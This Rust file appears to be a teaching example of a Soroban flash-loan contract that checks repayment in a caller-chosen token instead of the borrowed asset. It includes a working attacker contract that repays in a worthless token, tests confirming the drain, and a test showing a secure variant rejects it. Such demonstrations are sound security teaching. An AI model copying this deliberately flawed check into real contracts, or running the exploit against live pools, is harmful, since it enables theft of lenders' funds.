//! VULNERABLE: Flash Loan Repayment Accepts the Wrong Token
//!
//! After the loan callback, repayment is verified against a caller-supplied token
//! address instead of the borrowed asset. An attacker can repay with worthless
//! tokens while keeping the valuable borrowed asset.

#![no_std]
use soroban_sdk::{contract, contractimpl, contracttype, token, Address, Env};

pub mod secure;

#[contracttype]
pub enum DataKey {
    LoanRepaid,
}

pub mod callback {
    use soroban_sdk::{contractclient, Address, Env};

    #[contractclient(name = "BorrowerClient")]
    pub trait Borrower {
        fn on_flash_loan(
            env: Env,
            lender: Address,
            asset: Address,
            amount: i128,
            required: i128,
        );
    }
}

#[contract]
pub struct FlashRepayWrongToken;

#[contractimpl]
impl FlashRepayWrongToken {
    pub fn deposit(env: Env, token_addr: Address, from: Address, amount: i128) {
        from.require_auth();
        token::Client::new(&env, &token_addr).transfer(
            &from,
            &env.current_contract_address(),
            &amount,
        );
    }

    /// Issue a flash loan and verify repayment against `repay_token`.
    ///
    /// ❌ Uses caller-supplied `repay_token` instead of the borrowed `asset`.
    pub fn flash_loan(
        env: Env,
        borrower: Address,
        asset: Address,
        amount: i128,
        repay_token: Address,
    ) {
        let fee = amount / 100;
        let required = amount + fee;

        let asset_client = token::Client::new(&env, &asset);
        let balance_before = asset_client.balance(&env.current_contract_address());
        assert!(balance_before >= amount, "insufficient liquidity");

        asset_client.transfer(
            &env.current_contract_address(),
            &borrower,
            &amount,
        );

        let repay_client = token::Client::new(&env, &repay_token);
        let repay_before = repay_client.balance(&env.current_contract_address());

        callback::BorrowerClient::new(&env, &borrower).on_flash_loan(
            &env.current_contract_address(),
            &asset,
            &amount,
            &required,
        );

        let repay_after = repay_client.balance(&env.current_contract_address());
        assert!(
            repay_after - repay_before >= required,
            "repayment insufficient"
        );

        env.storage().persistent().set(&DataKey::LoanRepaid, &true);
    }

    pub fn is_repaid(env: Env) -> bool {
        env.storage()
            .persistent()
            .get(&DataKey::LoanRepaid)
            .unwrap_or(false)
    }
}

pub mod attacker {
    use soroban_sdk::{contract, contractimpl, contracttype, token, Address, Env};

    #[contracttype]
    pub enum Mode {
        WorthlessOnly,
        FeeShortfall,
    }

    #[contracttype]
    pub enum ConfigKey {
        Mode,
        WorthlessToken,
    }

    #[contract]
    pub struct AttackerBorrower;

    #[contractimpl]
    impl AttackerBorrower {
        pub fn configure(env: Env, mode: Mode, worthless_token: Address) {
            env.storage().persistent().set(&ConfigKey::Mode, &mode);
            env.storage()
                .persistent()
                .set(&ConfigKey::WorthlessToken, &worthless_token);
        }

        pub fn on_flash_loan(
            env: Env,
            lender: Address,
            asset: Address,
            amount: i128,
            required: i128,
        ) {
            let mode: Mode = env
                .storage()
                .persistent()
                .get(&ConfigKey::Mode)
                .expect("mode not configured");
            let worthless: Address = env
                .storage()
                .persistent()
                .get(&ConfigKey::WorthlessToken)
                .expect("worthless token not configured");

            let asset_client = token::Client::new(&env, &asset);
            let worthless_client = token::Client::new(&env, &worthless);

            match mode {
                Mode::WorthlessOnly => {
                    worthless_client.transfer(
                        &env.current_contract_address(),
                        &lender,
                        &required,
                    );
                }
                Mode::FeeShortfall => {
                    let fee = amount / 100;
                    let asset_repay = amount + fee - 1;
                    asset_client.transfer(
                        &env.current_contract_address(),
                        &lender,
                        &asset_repay,
                    );
                    worthless_client.transfer(
                        &env.current_contract_address(),
                        &lender,
                        &required,
                    );
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::attacker::{AttackerBorrower, AttackerBorrowerClient, Mode};
    use crate::secure::SecureFlashRepayClient;
    use soroban_sdk::{
        testutils::Address as _,
        token::{Client as TokenClient, StellarAssetClient},
        Address, Env,
    };

    const LOAN_AMOUNT: i128 = 1_000;
    const FEE: i128 = LOAN_AMOUNT / 100;
    const REQUIRED: i128 = LOAN_AMOUNT + FEE;

    fn setup_tokens(env: &Env) -> (Address, Address) {
        let valuable_admin = Address::generate(env);
        let worthless_admin = Address::generate(env);
        let valuable = env
            .register_stellar_asset_contract_v2(valuable_admin.clone())
            .address();
        let worthless = env
            .register_stellar_asset_contract_v2(worthless_admin.clone())
            .address();
        (valuable, worthless)
    }

    fn fund_pool(
        env: &Env,
        client: &FlashRepayWrongTokenClient,
        valuable: &Address,
        from: &Address,
        amount: i128,
    ) {
        StellarAssetClient::new(env, valuable).mint(from, &amount);
        client.deposit(valuable, from, &amount);
    }

    #[test]
    fn test_vulnerable_repay_with_worthless_token_keeps_valuable_asset() {
        let env = Env::default();
        env.mock_all_auths();

        let (valuable, worthless) = setup_tokens(&env);
        let lender_id = env.register_contract(None, FlashRepayWrongToken);
        let lender = FlashRepayWrongTokenClient::new(&env, &lender_id);
        let borrower_id = env.register_contract(None, AttackerBorrower);
        let borrower = AttackerBorrowerClient::new(&env, &borrower_id);

        let pool_funder = Address::generate(&env);
        fund_pool(&env, &lender, &valuable, &pool_funder, 10_000);

        StellarAssetClient::new(&env, &worthless).mint(&borrower_id, &REQUIRED);
        borrower.configure(&Mode::WorthlessOnly, &worthless);

        lender.flash_loan(&borrower_id, &valuable, &LOAN_AMOUNT, &worthless);

        assert!(lender.is_repaid());
        assert_eq!(
            TokenClient::new(&env, &valuable).balance(&borrower_id),
            LOAN_AMOUNT,
            "attacker keeps the valuable borrowed asset"
        );
        assert_eq!(
            TokenClient::new(&env, &worthless).balance(&lender_id),
            REQUIRED
        );
    }

    #[test]
    fn test_vulnerable_boundary_fee_shortfall_covered_by_worthless_token() {
        let env = Env::default();
        env.mock_all_auths();

        let (valuable, worthless) = setup_tokens(&env);
        let lender_id = env.register_contract(None, FlashRepayWrongToken);
        let lender = FlashRepayWrongTokenClient::new(&env, &lender_id);
        let borrower_id = env.register_contract(None, AttackerBorrower);
        let borrower = AttackerBorrowerClient::new(&env, &borrower_id);

        let pool_funder = Address::generate(&env);
        fund_pool(&env, &lender, &valuable, &pool_funder, 10_000);

        StellarAssetClient::new(&env, &worthless).mint(&borrower_id, &REQUIRED);
        StellarAssetClient::new(&env, &valuable).mint(&borrower_id, &(FEE - 1));
        borrower.configure(&Mode::FeeShortfall, &worthless);

        lender.flash_loan(&borrower_id, &valuable, &LOAN_AMOUNT, &worthless);

        assert!(lender.is_repaid());
        let pool_valuable = TokenClient::new(&env, &valuable).balance(&lender_id);
        assert_eq!(
            pool_valuable,
            10_000 - LOAN_AMOUNT + (LOAN_AMOUNT + FEE - 1),
            "valuable repayment is one fee unit short"
        );
        assert_eq!(
            TokenClient::new(&env, &worthless).balance(&lender_id),
            REQUIRED,
            "worthless token satisfies the wrong-token repayment check"
        );
    }

    #[test]
    #[should_panic(expected = "flash loan not repaid in borrowed asset")]
    fn test_secure_rejects_wrong_token_repayment() {
        let env = Env::default();
        env.mock_all_auths();

        let (valuable, worthless) = setup_tokens(&env);
        let lender_id = env.register_contract(None, secure::SecureFlashRepay);
        let lender = SecureFlashRepayClient::new(&env, &lender_id);
        let borrower_id = env.register_contract(None, AttackerBorrower);
        let borrower = AttackerBorrowerClient::new(&env, &borrower_id);

        let pool_funder = Address::generate(&env);
        StellarAssetClient::new(&env, &valuable).mint(&pool_funder, &10_000);
        lender.deposit(&valuable, &pool_funder, &10_000);

        StellarAssetClient::new(&env, &worthless).mint(&borrower_id, &REQUIRED);
        borrower.configure(&Mode::WorthlessOnly, &worthless);

        lender.flash_loan(&borrower_id, &valuable, &LOAN_AMOUNT);
    }
}
